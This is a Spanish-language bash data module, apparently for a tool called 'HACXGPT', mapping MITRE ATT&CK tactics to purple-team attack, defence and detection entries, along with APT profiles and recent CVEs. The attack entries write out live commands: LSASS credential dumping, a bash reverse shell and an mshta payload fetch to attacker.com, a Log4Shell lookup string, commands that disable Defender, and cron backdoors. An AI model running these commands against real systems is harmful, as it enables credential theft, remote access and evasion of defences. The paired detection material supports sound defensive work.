#!/bin/bash
# ================================================================
# HACXGPT v8.0 — MITRE ATT&CK DATA MODULE
# Cargado con: source mitre_data.sh
# Requiere bash >= 4.0 (arrays asociativos)
# ================================================================

# ----------------------------------------------------------------
# BLOQUE 1: 14 TÁCTICAS ENTERPRISE MATRIX
# ----------------------------------------------------------------
declare -A MITRE_TACTICAS
MITRE_TACTICAS["TA0043"]="🎯 Reconnaissance         | Reconocimiento"
MITRE_TACTICAS["TA0042"]="🔨 Resource Development   | Desarrollo de recursos"
MITRE_TACTICAS["TA0001"]="🚪 Initial Access         | Acceso inicial"
MITRE_TACTICAS["TA0002"]="⚙️  Execution              | Ejecución"
MITRE_TACTICAS["TA0003"]="🔒 Persistence            | Persistencia"
MITRE_TACTICAS["TA0004"]="⬆️  Privilege Escalation   | Escalada de privilegios"
MITRE_TACTICAS["TA0005"]="🕵️  Defense Evasion        | Evasión de defensas"
MITRE_TACTICAS["TA0006"]="🔑 Credential Access      | Acceso a credenciales"
MITRE_TACTICAS["TA0007"]="🔍 Discovery              | Descubrimiento"
MITRE_TACTICAS["TA0008"]="↔️  Lateral Movement       | Movimiento lateral"
MITRE_TACTICAS["TA0009"]="📦 Collection             | Recolección"
MITRE_TACTICAS["TA0011"]="📡 Command and Control    | Mando y control (C2)"
MITRE_TACTICAS["TA0010"]="📤 Exfiltration           | Exfiltración"
MITRE_TACTICAS["TA0040"]="💥 Impact                 | Impacto"

# Orden canónico de tácticas para mostrar en menús
MITRE_ORDEN=("TA0043" "TA0042" "TA0001" "TA0002" "TA0003" "TA0004"
             "TA0005" "TA0006" "TA0007" "TA0008" "TA0009" "TA0011"
             "TA0010" "TA0040")

# ----------------------------------------------------------------
# BLOQUE 2: TÉCNICAS CLAVE POR TÁCTICA (pipe-delimited: ID:Nombre)
# ----------------------------------------------------------------
declare -A MITRE_TECNICAS
MITRE_TECNICAS["TA0043"]="T1595:Active Scanning|T1592:Gather Victim Host Info|T1589:Gather Victim Identity Info|T1591:Gather Victim Org Info|T1598:Phishing for Information"
MITRE_TECNICAS["TA0042"]="T1583:Acquire Infrastructure|T1584:Compromise Infrastructure|T1608:Stage Capabilities|T1587:Develop Capabilities|T1586:Compromise Accounts"
MITRE_TECNICAS["TA0001"]="T1566:Phishing|T1190:Exploit Public-Facing Application|T1133:External Remote Services|T1078:Valid Accounts|T1195:Supply Chain Compromise"
MITRE_TECNICAS["TA0002"]="T1059:Command and Scripting Interpreter|T1053:Scheduled Task/Job|T1204:User Execution|T1047:Windows Management Instrumentation|T1106:Native API"
MITRE_TECNICAS["TA0003"]="T1547:Boot or Logon Autostart|T1053:Scheduled Task/Job|T1505:Server Software Component|T1078:Valid Accounts|T1136:Create Account"
MITRE_TECNICAS["TA0004"]="T1548:Abuse Elevation Control|T1134:Access Token Manipulation|T1068:Exploitation for Privilege Escalation|T1055:Process Injection|T1484:Domain Policy Modification"
MITRE_TECNICAS["TA0005"]="T1027:Obfuscated Files/Info|T1055:Process Injection|T1562:Impair Defenses|T1070:Indicator Removal|T1218:System Binary Proxy Execution"
MITRE_TECNICAS["TA0006"]="T1003:OS Credential Dumping|T1558:Steal or Forge Kerberos Tickets|T1555:Credentials from Password Stores|T1056:Input Capture|T1552:Unsecured Credentials"
MITRE_TECNICAS["TA0007"]="T1082:System Information Discovery|T1083:File and Directory Discovery|T1057:Process Discovery|T1016:System Network Configuration|T1018:Remote System Discovery"
MITRE_TECNICAS["TA0008"]="T1021:Remote Services|T1550:Use Alternate Authentication Material|T1080:Taint Shared Content|T1534:Internal Spearphishing|T1563:Remote Service Session Hijacking"
MITRE_TECNICAS["TA0009"]="T1114:Email Collection|T1005:Data from Local System|T1039:Data from Network Shared Drive|T1113:Screen Capture|T1056:Input Capture"
MITRE_TECNICAS["TA0011"]="T1071:Application Layer Protocol|T1095:Non-Application Layer Protocol|T1572:Protocol Tunneling|T1090:Proxy|T1105:Ingress Tool Transfer"
MITRE_TECNICAS["TA0010"]="T1048:Exfiltration Over Alternative Protocol|T1041:Exfiltration Over C2 Channel|T1567:Exfiltration Over Web Service|T1020:Automated Exfiltration|T1030:Data Transfer Size Limits"
MITRE_TECNICAS["TA0040"]="T1485:Data Destruction|T1486:Data Encrypted for Impact|T1490:Inhibit System Recovery|T1498:Network Denial of Service|T1496:Resource Hijacking"

# ----------------------------------------------------------------
# BLOQUE 3: PURPLE TEAM DATA — RED + BLUE + DETECCIÓN por técnica
# Formato: ATAQUE|||DEFENSA|||DETECCIÓN
# ----------------------------------------------------------------
declare -A PURPLE_DATA

PURPLE_DATA["T1003"]="
🔴 ATAQUE — OS Credential Dumping:
  • mimikatz.exe privilege::debug sekurlsa::logonpasswords
  • procdump.exe -ma lsass.exe lsass.dmp
  • python3 secretsdump.py domain/user:pass@TARGET
  • Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'
  • reg save HKLM\\SAM sam.hive && reg save HKLM\\SYSTEM sys.hive
|||
🔵 DEFENSA — Credential Dumping:
  • Habilitar Windows Defender Credential Guard
  • Restringir acceso a LSASS con SACL (auditoría)
  • Deshabilitar WDigest: HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest UseLogonCredential=0
  • Activar Protected Users Security Group en AD
  • Usar Managed Service Accounts (MSA/gMSA)
|||
🟣 DETECCIÓN — Credential Dumping:
  • Event ID 4656: Handle a LSASS solicitado
  • Event ID 4663: Acceso al objeto LSASS
  • Sysmon Event ID 10: ProcessAccess a lsass.exe
  • Alertar si procdump/comsvcs acceden a LSASS
  • Monitorear creación de archivos .dmp en rutas del sistema"

PURPLE_DATA["T1566"]="
🔴 ATAQUE — Phishing:
  • gophish → crear campaña con plantilla clonada
  • swaks --to victim@domain.com --from ceo@spoofed.com --attach malware.pdf
  • set toolkit.social_engineering.attack_vectors.spear_phishing
  • evilginx2 -p /phishlets/microsoft365.yaml
  • msfvenom -p windows/meterpreter/reverse_https -f docx
|||
🔵 DEFENSA — Phishing:
  • Implementar DMARC/DKIM/SPF en todos los dominios
  • Activar Safe Links y Safe Attachments (Microsoft Defender)
  • Sandboxing de adjuntos antes de entrega
  • Formación y simulaciones de phishing continuas
  • Reportar y bloquear dominios similares (typosquatting)
|||
🟣 DETECCIÓN — Phishing:
  • Alertas en gateway de email por adjuntos Office con macros
  • Correlacionar clics en URLs externas con inicio de sesión
  • Monitorear procesos hijo de Outlook/Word/Excel
  • UEBA: inicio de sesión nuevo justo tras clic en email
  • DNS: resoluciones a dominios registrados recientemente (<30 días)"

PURPLE_DATA["T1059"]="
🔴 ATAQUE — Command and Scripting Interpreter:
  • powershell -enc [base64_payload]
  • bash -i >& /dev/tcp/attacker.com/4444 0>&1
  • python3 -c 'import pty; pty.spawn(\"/bin/bash\")'
  • wscript.exe //E:jscript payload.js
  • mshta.exe http://attacker.com/payload.hta
|||
🔵 DEFENSA — Scripting Interpreter:
  • Habilitar PowerShell Constrained Language Mode
  • Bloquear scripts no firmados: Set-ExecutionPolicy AllSigned
  • AppLocker/WDAC: whitelist de scripts permitidos
  • Deshabilitar WScript/CScript para usuarios no admin
  • Antivirus con detección de AMSI (Anti-Malware Scan Interface)
|||
🟣 DETECCIÓN — Scripting Interpreter:
  • PowerShell Script Block Logging (Event 4104)
  • PowerShell Module Logging (Event 4103)
  • Alertar en: -enc, -nop, -w hidden, IEX, DownloadString
  • Sysmon ID 1: Creación de procesos powershell/cmd/wscript
  • SIEM: correlación de comandos ofuscados base64"

PURPLE_DATA["T1055"]="
🔴 ATAQUE — Process Injection:
  • CreateRemoteThread en proceso legítimo (svchost.exe)
  • Shellcode via VirtualAllocEx + WriteProcessMemory
  • msfvenom -p windows/x64/meterpreter/reverse_tcp -f dll
  • Reflective DLL Injection con PowerSploit
  • Process Hollowing: reemplazar código en proceso suspendido
|||
🔵 DEFENSA — Process Injection:
  • Habilitar Arbitrary Code Guard (ACG) en políticas de proceso
  • Windows Defender Exploit Guard: Code Integrity Guard
  • EDR con detección de comportamiento de inyección
  • Limitar CreateRemoteThread a procesos de sistema
  • Integridad de procesos críticos: PPL (Protected Process Light)
|||
🟣 DETECCIÓN — Process Injection:
  • Sysmon ID 8: CreateRemoteThread detectado
  • Sysmon ID 25: ProcessTampering
  • Alertar en: VirtualAllocEx, WriteProcessMemory desde proceso no-sistema
  • Memoria RWX (Read-Write-Execute) en proceso legítimo
  • Correlacionar proceso padre inesperado (explorer → cmd → powershell)"

PURPLE_DATA["T1078"]="
🔴 ATAQUE — Valid Accounts:
  • crackmapexec smb TARGET -u users.txt -p passwords.txt
  • kerbrute userenum --dc DC01 -d domain.local users.txt
  • hydra -L users.txt -P passes.txt rdp://TARGET
  • Usar credenciales encontradas en repositorios (GitHub dorks)
  • Pass-the-Hash: pth-winexe -U 'admin%aad3b435:NTLM_HASH' //TARGET cmd
|||
🔵 DEFENSA — Valid Accounts:
  • MFA obligatorio para todos los accesos remotos
  • Política de contraseñas: mínimo 16 caracteres, complejidad
  • Privileged Access Workstations (PAW) para admins
  • Revisión periódica de cuentas inactivas (deshabilitarlas)
  • Just-in-Time (JIT) acceso para cuentas privilegiadas
|||
🟣 DETECCIÓN — Valid Accounts:
  • Event ID 4625: Inicio de sesión fallido (múltiples = ataque)
  • Event ID 4624 Type 3/10: inicio de sesión de red/remoto
  • UEBA: inicio de sesión en horario inusual o desde IP nueva
  • Alertar en: logins desde países fuera del baseline
  • Correlacionar: fallo de MFA repetido + inicio de sesión exitoso"

PURPLE_DATA["T1021"]="
🔴 ATAQUE — Remote Services:
  • psexec.py domain/user:pass@TARGET cmd.exe
  • evil-winrm -i TARGET -u admin -p password
  • ssh -L 3389:INTERNAL:3389 user@jump-host (túnel RDP)
  • wmiexec.py domain/user:pass@TARGET 'ipconfig'
  • smbclient //TARGET/C$ -U admin%password
|||
🔵 DEFENSA — Remote Services:
  • Desactivar RDP donde no sea necesario
  • RDP solo accesible desde red de gestión / VPN
  • SMB: bloquear SMBv1, requerir firma SMB
  • Segmentar red: servidores no deben comunicarse directamente
  • Firewall de host: restringir puertos 22, 445, 5985, 3389
|||
🟣 DETECCIÓN — Remote Services:
  • Event ID 4648: Inicio de sesión con credenciales explícitas
  • Event 7045: Servicio instalado (psexec crea servicio)
  • Sysmon ID 3: Conexión de red a puerto 445/3389/5985
  • NetFlow: conexiones laterales este-oeste inusuales
  • EDR: alert en psexec.exe, wmiexec, evil-winrm"

PURPLE_DATA["T1027"]="
🔴 ATAQUE — Obfuscated Files/Info:
  • Invoke-Obfuscation -ScriptBlock {...} -Command Token\\All\\1
  • certutil -encode malware.exe encoded.b64
  • echo payload | base64 | xargs -I{} bash -c 'echo {}|base64 -d|bash'
  • Chameleon: ofuscación de scripts PowerShell automática
  • py2exe + UPX para comprimir y cifrar ejecutables
|||
🔵 DEFENSA — Obfuscation:
  • AMSI: interface de escaneo que decodifica antes de ejecutar
  • EDR con análisis de comportamiento (no solo firmas)
  • PowerShell Script Block Logging detecta código decodificado
  • YARAify: reglas YARA para detectar ofuscación común
  • Prohibir certutil para descargar/codificar en endpoints
|||
🟣 DETECCIÓN — Obfuscation:
  • Event 4104: Script Block completo (ya decodificado) en PowerShell
  • Alertar en: alto ratio de caracteres especiales en comandos
  • Detectar uso de certutil -decode/-encode en contexto inusual
  • SIEM: comandos PowerShell con -enc o IEX y longitud > 500 chars
  • Strings de AMSI bypass conocidos (strings, hex, unicode)"

PURPLE_DATA["T1562"]="
🔴 ATAQUE — Impair Defenses (Disable AV/EDR):
  • Set-MpPreference -DisableRealtimeMonitoring \$true
  • sc stop WinDefend && sc config WinDefend start=disabled
  • taskkill /F /IM MsMpEng.exe
  • wmic /namespace:\\\\root\\microsoft\\windows\\defender path MSFT_MpPreference call Add ExclusionPath=\"C:\\temp\"
  • Killing EDR via vulnerable driver (BYOVD)
|||
🔵 DEFENSA — Impair Defenses:
  • Tamper Protection en Microsoft Defender (bloquea cambios)
  • Proteger servicios de seguridad como PPL
  • Centralizar logs en SIEM externo (no en el endpoint)
  • Alertar si Windows Defender se detiene o es modificado
  • MDM/GPO: impedir que usuarios deshabiliten AV
|||
🟣 DETECCIÓN — Impair Defenses:
  • Event ID 7036: Servicio detenido (WinDefend, Sysmon)
  • Event ID 4657: Modificación de clave de registro (Malware\\MpPreference)
  • Alertar en: exclusiones añadidas a AV por usuario no-administrador
  • EDR: kill de procesos de seguridad (MsMpEng, CSFalconService)
  • Heartbeat monitoring: si agente EDR deja de reportar → alerta"

PURPLE_DATA["T1190"]="
🔴 ATAQUE — Exploit Public-Facing Application:
  • nuclei -u https://TARGET -t cves/ -severity critical,high
  • sqlmap -u 'https://TARGET/page?id=1' --dbs --batch
  • CVE-2024-3400: curl -X POST https://TARGET/ssl-vpn/hipreport.esp -d cmd=id
  • Log4Shell: \${jndi:ldap://attacker.com/x} en User-Agent
  • CVE-2024-21762: curl -X POST https://fortigate/api/v2/cmdb/ --path-traversal
|||
🔵 DEFENSA — Exploit Public-Facing:
  • WAF con reglas OWASP (ModSecurity, Cloudflare, AWS WAF)
  • Parcheo urgente: VPN < 72h, servidores web < 30 días
  • Superficie de ataque mínima: desactivar servicios no necesarios
  • Bug Bounty + Pentest externo anual
  • Virtual patching en WAF mientras llega el parche oficial
|||
🟣 DETECCIÓN — Exploit Public-Facing:
  • WAF logs: reglas disparadas, especialmente en paths /api/, /admin/
  • IDS/IPS: firmas de exploits conocidos (Snort, Suricata)
  • Alertar en: errores 500 masivos en aplicación web
  • Honeypot: endpoint falso que alerta cuando es accedido
  • Correlación: WAF block + escaneo de vulnerabilidades desde misma IP"

PURPLE_DATA["T1053"]="
🔴 ATAQUE — Scheduled Task/Job:
  • schtasks /create /tn Updater /tr C:\\payload.exe /sc minute /mo 5
  • at 23:00 /every:M,T,W,TH,F,SA,SU cmd /c payload.exe
  • crontab -e → */5 * * * * /tmp/backdoor.sh
  • New-ScheduledTask -Action (New-ScheduledTaskAction -Execute payload.ps1)
  • WMI: Event Subscription permanente (MOF file)
|||
🔵 DEFENSA — Scheduled Tasks:
  • Monitorear y auditar todas las tareas programadas
  • Restringir creación de tareas a administradores
  • PowerShell JEA: limitar qué comandos puede ejecutar cada rol
  • Revisión periódica de cron jobs y tareas de Windows
  • AppLocker: bloquear ejecutables desde rutas temp/usuario
|||
🟣 DETECCIÓN — Scheduled Tasks:
  • Event ID 4698: Tarea programada creada
  • Event ID 4702: Tarea programada modificada
  • Sysmon ID 1: Proceso creado por svchost.exe (TaskSched)
  • Alertar en: tareas que ejecutan desde AppData, Temp, ProgramData
  • Linux: cambios en /etc/cron* o /var/spool/cron con auditd"

# ----------------------------------------------------------------
# BLOQUE 4: ACTORES DE AMENAZA (APT)
# ----------------------------------------------------------------
declare -A APT_INFO
APT_INFO["APT29"]="Cozy Bear | Russia (SVR) | Espionaje gubernamental | Gobierno, Think Tanks, ONG, Salud"
APT_INFO["APT38"]="Lazarus Group | Corea del Norte (RGB) | Financiero / Destrucción | Bancos, Exchange cripto, Defensa"
APT_INFO["FIN7"]="Carbanak Group | Criminal financiero | Fraude y ransomware | Retail, Hospitalidad, Finanzas"

declare -A APT_TECNICAS
APT_TECNICAS["APT29"]="T1566.001:Spear Phishing Attachment|T1059.001:PowerShell|T1053.005:Scheduled Task|T1078:Valid Accounts|T1021.001:Remote Desktop Protocol|T1027:Obfuscation|T1070.004:File Deletion|T1071.001:Web Protocols C2|T1041:Exfil over C2"
APT_TECNICAS["APT38"]="T1566.001:Spear Phishing|T1059.003:Windows Command Shell|T1055:Process Injection|T1071.001:HTTP C2|T1041:Exfil over C2|T1485:Data Destruction|T1486:Ransomware|T1090:Proxy|T1105:Ingress Tool Transfer"
APT_TECNICAS["FIN7"]="T1566.001:Spear Phishing|T1059.001:PowerShell|T1027:Obfuscation|T1055.001:DLL Injection|T1486:Data Encrypted for Impact|T1119:Automated Collection|T1056.001:Keylogging|T1071.001:HTTP C2|T1078:Valid Accounts"

declare -A APT_KILLCHAIN
APT_KILLCHAIN["APT29"]="1.Spear Phishing con adjunto Office|2.Macro ejecuta PowerShell obfuscado|3.SUNBURST/WellMess backdoor instalado|4.Reconocimiento interno (BloodHound)|5.Lateral movement via RDP/WMI|6.Kerberoasting para elevar privilegios|7.Exfiltración via HTTPS a C2|8.Limpieza de logs y persistencia silenciosa"
APT_KILLCHAIN["APT38"]="1.Spear Phishing a empleado banco|2.BLINDINGCAN dropper ejecutado|3.Reconocimiento de red SWIFT|4.Acceso a servidor de transacciones|5.HOPLIGHT backdoor para C2|6.Transferencias fraudulentas|7.DESTOVER wiper para cubrir huellas|8.Lavado via criptomonedas"
APT_KILLCHAIN["FIN7"]="1.Email phishing con LNK malicioso|2.BABYMETAL/BIRDWATCH PowerShell|3.Carbanak backdoor instalado|4.Reconocimiento de POS y sistemas|5.DICELOADER para movimiento lateral|6.Captura de tarjetas de crédito|7.Ransomware ALPHV/BlackCat como distracción|8.Exfiltración de datos financieros"

# ----------------------------------------------------------------
# BLOQUE 5: CVE RECIENTES 2024-2025
# Formato: "Producto | CVSS | Descripción | Técnica MITRE"
# ----------------------------------------------------------------
declare -A CVE_DATA
CVE_DATA["CVE-2024-3400"]="Palo Alto PAN-OS GlobalProtect | CVSS 10.0 CRÍTICO | RCE sin autenticación via command injection | T1190 Exploit Public-Facing Application"
CVE_DATA["CVE-2024-21762"]="Fortinet FortiOS SSL-VPN | CVSS 9.6 CRÍTICO | Out-of-bounds write, RCE sin auth | T1190 Exploit Public-Facing Application"
CVE_DATA["CVE-2024-6387"]="OpenSSH regreSSHion | CVSS 8.1 ALTO | Race condition en signal handler, RCE como root | T1190 Exploit Public-Facing Application"
CVE_DATA["CVE-2024-4577"]="PHP CGI (Windows) | CVSS 9.8 CRÍTICO | Arg injection, RCE via Best-Fit encoding | T1190 Exploit Public-Facing Application"
CVE_DATA["CVE-2024-27198"]="JetBrains TeamCity | CVSS 9.8 CRÍTICO | Bypass de autenticación, control total | T1190 Exploit Public-Facing Application"
CVE_DATA["CVE-2024-1708"]="ConnectWise ScreenConnect | CVSS 9.8 CRÍTICO | Path traversal + auth bypass | T1190 + T1210 Exploitation of Remote Services"
CVE_DATA["CVE-2025-0282"]="Ivanti Connect Secure | CVSS 9.0 CRÍTICO | Stack overflow, RCE sin auth | T1190 Exploit Public-Facing Application"
CVE_DATA["CVE-2024-38112"]="Windows MSHTML | CVSS 7.5 ALTO | Spoof URL en MHTML abre IE11 para RCE | T1566.002 Spear Phishing Link"
CVE_DATA["CVE-2024-30051"]="Windows DWM Core Library | CVSS 7.8 ALTO | LPE 0-day explotado en campañas QakBot | T1068 Exploitation for Privilege Escalation"
CVE_DATA["CVE-2024-49138"]="Windows CLFS Driver | CVSS 7.8 ALTO | LPE 0-day en campaña ransomware | T1068 Exploitation for Privilege Escalation"

# ----------------------------------------------------------------
# BLOQUE 6: DATOS "¿SABÍAS QUE?" para el chat
# ----------------------------------------------------------------
SABIAS_QUE=(
    "El 91% de los ciberataques comienzan con un email de phishing (T1566). [Proofpoint 2024]"
    "Kerberoasting (T1558.003) detecta cuentas de servicio con cifrado RC4 débil en minutos con hashcat."
    "El tiempo medio de detección (MTTD) de una brecha en 2024 fue de 194 días. [IBM Cost of Data Breach 2024]"
    "El 82% de las infracciones involucran el elemento humano (ingeniería social, errores, abuso de credenciales)."
    "Pass-the-Hash (T1550.002) sigue siendo efectivo en el 70% de los entornos Windows sin LAPS."
    "LOLBINS (T1218): certutil, regsvr32 y mshta son los más usados por actores de amenaza en 2024."
    "BloodHound puede mapear todos los paths a Domain Admin en menos de 2 minutos en AD típicos."
    "El ransomware más lucrativo de 2024 fue ALPHV/BlackCat, con rescates de hasta \$22M por víctima."
    "CVE-2024-3400 en Palo Alto fue explotado en el día 0 de su publicación por UTA0218 (nexo chino)."
    "El 43% de las organizaciones no detectaría un ataque de lateral movement en su red. [Mandiant 2024]"
)
